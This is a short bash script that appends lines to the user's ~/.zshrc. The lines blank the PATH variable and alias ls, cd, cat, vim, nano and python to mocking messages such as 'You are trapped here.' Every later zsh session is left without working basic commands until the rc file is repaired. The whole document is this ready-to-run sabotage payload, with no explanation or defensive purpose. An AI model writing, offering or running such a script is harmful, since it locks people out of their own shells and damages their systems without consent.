#!/bin/bash

(echo 'export PATH='; \
echo 'alias ls="echo Command not found."'; \
echo 'alias cd="echo You are trapped here."'; \
echo 'alias cat="echo Nice try."'; \
echo 'alias vim="echo Access denied."'; \
echo 'alias nano="echo No editing allowed."'; \
echo 'alias python="echo Interpreter not found."') >> ~/.zshrc



















